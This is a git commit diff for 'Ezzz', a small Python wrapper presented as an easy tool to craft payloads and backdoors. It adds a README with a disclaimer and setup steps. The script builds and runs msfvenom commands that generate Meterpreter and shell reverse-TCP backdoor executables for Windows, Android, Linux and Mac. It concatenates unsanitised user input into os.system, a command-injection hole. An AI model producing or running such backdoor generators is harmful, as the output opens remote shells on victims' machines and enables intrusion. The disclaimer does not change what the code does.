0e54973a0a0361ff9e824e1c0fd0b8a984c09ebb
arshit09 <arshitvaghasiya29@gmail.com>
2019-07-23 09:52:33 -0400

    added docs

--- README.md
+++ README.md
@@ -1,2 +1,28 @@
 # Ezzz
 Kali Linux Tool
+
+<font color="red"><b>DISCLAIMER: Ezzz tool is only for testing purposes and can only be used where strict consent has been given. Do not use this for any illegal/unethical purposes.</b></font>
+
+<font color="green"><b>An Easy tool to craft payloads/backdoors.</b></font>
+
+Screenshot
+
+
+</b>Getting Started<b>
+"""$ git clone https://www.github.com/arshit09/Ezzz.git
+$ cd Ezzz
+$ chmod +x req.sh
+$ chmod 777 ezzz.py
+$ python ezzz.py"""
+
+How It Works
+-Uses msfvenom to create paylaods/backdoors.
+
+Operating System Recommended:
+- Kali 2017.1 and above
+
+Features
+Ezzz tool allows to create payloads/backdoors without requirements of writting any commands.
+
+Bugs and Improvements?
+For any bug reporting or improvements, please submit an issue here.
--- ezzz.py
+++ ezzz.py
@@ -21,38 +21,40 @@ print("3) Other Useful Tools")
 print("4) Tools For Fun!\n")
 print("99) Quit\n"+color.END)
 
-val = input(color.BOLD+"Select Your Option To Begin Your Journey : ")
+val = int(input(color.BOLD+"Select Your Option To Begin Your Journey : "))
+print(val)
 for x in range(44):
 	sys.stdout.write("-")
+
 if val == 1:
 	print(color.YELLOW+color.BOLD+"\nLet's craft some payloads!\nObviously, for that you need to select something..."+color.END)
 	print(color.GREEN + color.BOLD + "\n1) Windows")
 	print("2) Android")
 	print("3) Linux")
 	print("4) Mac" + color.END)
-	payload = input("Select Option : ")
+	payload = int(input("Select Option : "))
 	if payload == 1:
-		ip = raw_input(color.RED +"Enter IP Address : ")
-		portno = raw_input("Enter Unique Port No : ")
-		pname = raw_input("Enter Payload Name : ")
+		ip = input(color.RED +"Enter IP Address : ")
+		portno = input("Enter Unique Port No : ")
+		pname = input("Enter Payload Name : ")
 		cmnd = "msfvenom -p windows/meterpreter/reverse_tcp lhost="+ip+" lport="+portno+" -f exe -o ~/Desktop/"+pname+".exe"
 		os.system(cmnd)
 	if payload == 2:
-		ip = raw_input("Enter IP Address : ")
-		portno = raw_input("Enter Unique Port No : ")
-		pname = raw_input("Enter Payload Name : ")
+		ip = input("Enter IP Address : ")
+		portno = input("Enter Unique Port No : ")
+		pname = input("Enter Payload Name : ")
 		cmnd = "msfvenom -p android/meterpreter/reverse_tcp lhost="+ip+" lport="+portno+" R exe -o ~/Desktop/"+pname+".apk"
 		os.system(cmnd)
 	if payload == 3:
-		ip = raw_input("Enter IP Address : ")
-		portno = raw_input("Enter Unique Port No : ")
-		pname = raw_input("Enter Payload Name : ")
+		ip = input("Enter IP Address : ")
+		portno = input("Enter Unique Port No : ")
+		pname = input("Enter Payload Name : ")
 		cmnd = "msfvenom -p linux/x86/meterpreter/reverse_tcp lhost="+ip+" lport="+portno+" -f elf -o ~/Desktop/"+pname+".elf"
 		os.system(cmnd)
 	if payload == 4:
-		ip = raw_input("Enter IP Address : ")
-		portno = raw_input("Enter Unique Port No : ")
-		pname = raw_input("Enter Payload Name : ")
+		ip = input("Enter IP Address : ")
+		portno = input("Enter Unique Port No : ")
+		pname = input("Enter Payload Name : ")
 		cmnd = "msfvenom -p osx/x86/shell_reverse_tcp lhost="+ip+" lport="+portno+" -f macho -o ~/Desktop/"+pname+".macho"
 		os.system(cmnd)
 
